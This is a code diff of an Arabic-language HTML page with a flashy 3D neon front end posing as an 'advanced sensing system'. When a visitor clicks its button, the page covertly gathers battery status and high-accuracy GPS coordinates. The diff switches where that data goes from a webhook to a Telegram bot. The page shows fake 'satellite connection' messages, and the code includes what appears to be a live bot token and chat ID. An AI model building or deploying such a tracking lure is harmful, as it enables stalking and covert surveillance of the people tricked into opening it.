@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام الاستشعار المتقدم 2026</title>
+    <title>نظام الاستشعار المتقدم 2026 | ربط تيليجرام</title>
     <style>
         /* إعدادات الواجهة النيون والزجاجية */
         body { 
@@ -83,7 +83,7 @@
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script>
-        // إعدادات الخلفية الـ 3D التفاعلية (جسيمات نيون)
+        // إعدادات الخلفية الـ 3D التفاعلية
         const scene = new THREE.Scene();
         const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
         const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
@@ -107,13 +107,11 @@
         let mouseX = 0; 
         let mouseY = 0;
 
-        // تفاعل مع الماوس
         document.addEventListener('mousemove', (event) => {
             mouseX = (event.clientX / window.innerWidth) - 0.5;
             mouseY = (event.clientY / window.innerHeight) - 0.5;
         });
 
-        // تفاعل مع اللمس بالجوال
         document.addEventListener('touchmove', (event) => {
             mouseX = (event.touches[0].clientX / window.innerWidth) - 0.5;
             mouseY = (event.touches[0].clientY / window.innerHeight) - 0.5;
@@ -124,7 +122,6 @@
             particlesMesh.rotation.y += 0.002;
             particlesMesh.rotation.x += 0.001;
             
-            // حركة ناعمة تتفاعل مع اللمس
             particlesMesh.position.x += (mouseX * 3 - particlesMesh.position.x) * 0.05;
             particlesMesh.position.y += (-mouseY * 3 - particlesMesh.position.y) * 0.05;
             
@@ -133,27 +130,29 @@
         animate();
 
         // -----------------------------------------
-        // نظام استخراج البيانات (شحن وبطارية وموقع)
+        // إعدادات بوت التيليجرام
         // -----------------------------------------
         
-        // **مهم**: ضع هنا رابط الـ Webhook الخاص بك (Discord أو Firebase Functions)
-        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
+        // خلي التوكن مالتك هنا بين الأقواس
+        const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
+        // خلي الـ ID الخاص بحسابك هنا
+        const CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID_HERE';
 
         const activateBtn = document.getElementById('activateBtn');
         const statusBox = document.getElementById('statusBox');
 
         activateBtn.addEventListener('click', async () => {
-            statusBox.innerHTML = "<span style='color:#00ffff;'>جاري استخراج البيانات المشفرة...</span>";
-            let extractedData = { content: "🌐 **تقرير النظام المتقدم** 🌐\n\n" };
+            statusBox.innerHTML = "<span style='color:#00ffff;'>جاري استخراج البيانات...</span>";
+            let messageText = "🌐 **تقرير النظام المتقدم** 🌐\n\n";
 
             // 1. استخراج حالة البطارية
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    extractedData.content += `🔋 نسبة الشحن: ${Math.round(battery.level * 100)}%\n`;
-                    extractedData.content += `⚡ متصل بالطاقة: ${battery.charging ? 'نعم' : 'لا'}\n`;
+                    messageText += `🔋 نسبة الشحن: ${Math.round(battery.level * 100)}%\n`;
+                    messageText += `⚡ متصل بالطاقة: ${battery.charging ? 'نعم' : 'لا'}\n`;
                 } else {
-                    extractedData.content += "🔋 الشحن: غير مدعوم في هذا المتصفح\n";
+                    messageText += "🔋 الشحن: غير مدعوم في هذا المتصفح\n";
                 }
             } catch (error) {
                 console.error("Battery API Error:", error);
@@ -167,42 +166,54 @@
                         const lon = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
                         
-                        extractedData.content += `📍 الموقع المباشر: https://www.google.com/maps?q=${lat},${lon}\n`;
-                        extractedData.content += `🎯 دقة التحديد: ${Math.round(accuracy)} متر\n`;
+                        messageText += `📍 الموقع المباشر: https://maps.google.com/?q=${lat},${lon}\n`;
+                        messageText += `🎯 دقة التحديد: ${Math.round(accuracy)} متر\n`;
                         
-                        // إرسال البيانات بعد نجاح الحصول على الموقع
-                        transmitData(extractedData);
+                        // إرسال البيانات للتيليجرام
+                        sendToTelegram(messageText);
                         statusBox.innerHTML = "<span style='color:#00ff00;'>تمت العملية بنجاح. النظام مفعل.</span>";
                     }, 
                     (error) => {
-                        extractedData.content += `❌ الموقع: تم رفض الصلاحية أو تعذر الوصول للإحداثيات.\n`;
-                        transmitData(extractedData);
+                        messageText += `❌ الموقع: تم رفض الصلاحية أو تعذر الوصول للإحداثيات.\n`;
+                        sendToTelegram(messageText);
                         statusBox.innerHTML = "<span style='color:#ff0000;'>فشل الاتصال بالأقمار الصناعية (تم الرفض).</span>";
                     }, 
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             } else {
-                extractedData.content += "❌ الموقع: المتصفح لا يدعم تحديد الموقع.\n";
-                transmitData(extractedData);
+                messageText += "❌ الموقع: المتصفح لا يدعم تحديد الموقع.\n";
+                sendToTelegram(messageText);
                 statusBox.innerHTML = "النظام غير مدعوم.";
             }
         });
 
-        // دالة إرسال البيانات للسيرفر الخاص بيك
-        function transmitData(dataPayload) {
-            if (WEBHOOK_URL === 'YOUR_WEBHOOK_URL_HERE') {
-                console.log("لم يتم إعداد رابط الـ Webhook. البيانات المستخرجة:", dataPayload.content);
+        // دالة إرسال البيانات لتيليجرام باستخدام API
+        function sendToTelegram(text) {
+            if (BOT_TOKEN === '7925284808:AAHruzGSd8itzV_Q19TjncCHhP0yNwanPWg' || CHAT_ID === '8597271751') {
+                console.error("لازم تخلي الـ BOT_TOKEN والـ CHAT_ID بالكود.");
                 return;
             }
 
-            fetch(WEBHOOK_URL, {
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(telegramUrl, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(dataPayload)
-            }).catch(err => console.error('خطأ في نقل البيانات:', err));
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(!data.ok) console.error('خطأ من تيليجرام:', data.description);
+            })
+            .catch(err => console.error('خطأ في إرسال البيانات:', err));
         }
 
-        // استجابة الشاشة لتغيير الحجم
         window.addEventListener('resize', () => {
             camera.aspect = window.innerWidth / window.innerHeight;
             camera.updateProjectionMatrix();
